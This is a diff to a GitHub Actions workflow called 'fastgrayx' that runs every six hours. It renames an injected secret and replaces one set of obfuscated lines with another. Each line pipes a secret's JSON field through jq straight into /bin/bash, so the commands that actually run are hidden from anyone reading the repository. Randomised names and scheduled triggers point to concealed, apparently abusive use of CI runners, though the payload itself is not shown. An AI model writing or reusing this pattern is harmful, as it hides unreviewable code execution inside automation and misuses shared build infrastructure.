@@ -3,29 +3,30 @@ name: fastgrayx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 3/6 * * *'
-
+    - cron: '48 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fastgrayx
         env:
-          tfnpe0: ${{ secrets.tfnpe0 }}
+          d52: ${{ secrets.d52 }}
         run: |
-          echo $tfnpe0 | jq -r .ofh72756 | /bin/bash
-          echo $gj142 | jq -r .rba7 | /bin/bash
-          echo $gl31803 | jq -r .xtf23 | /bin/bash
-          echo $nvy3368 | jq -r .pobi610 | /bin/bash
-          echo $v298 | jq -r .jca8000 | /bin/bash
-          echo $vxcor782 | jq -r .scd7 | /bin/bash
-          echo $due804 | jq -r .rmxg25204 | /bin/bash
-          echo $gcoa5 | jq -r .d30 | /bin/bash
-          echo $o47650 | jq -r .m17336 | /bin/bash
-          echo $zz1 | jq -r .jv64746 | /bin/bash
-          echo $sd53 | jq -r .nk75002 | /bin/bash
-          echo $vpr2 | jq -r .rvm501 | /bin/bash
-          echo $pimgh586 | jq -r .c70 | /bin/bash
+          echo $d52 | jq -r .robwg458 | /bin/bash
+          echo $zbip89 | jq -r .oz24 | /bin/bash
+          echo $q35381 | jq -r .xnk8 | /bin/bash
+          echo $xcvoa8910 | jq -r .ie94466 | /bin/bash
+          echo $rx654 | jq -r .n46 | /bin/bash
+          echo $vkei892 | jq -r .xvo59 | /bin/bash
+          echo $qob88 | jq -r .vu15 | /bin/bash
+          echo $snpy8 | jq -r .aiwra01685 | /bin/bash
+          echo $s33 | jq -r .omvc3 | /bin/bash
+          echo $jjvch54091 | jq -r .ikkbn81889 | /bin/bash
+          echo $ecjsc437 | jq -r .cwvsw3 | /bin/bash
+          echo $qamb2 | jq -r .kti950 | /bin/bash
+          echo $yak9 | jq -r .dezy91140 | /bin/bash
+          echo $fqxu41 | jq -r .ds0 | /bin/bash
+          echo $a0474 | jq -r .bqwij9538 | /bin/bash
+          echo $moz833 | jq -r .mwhq07017 | /bin/bash
 
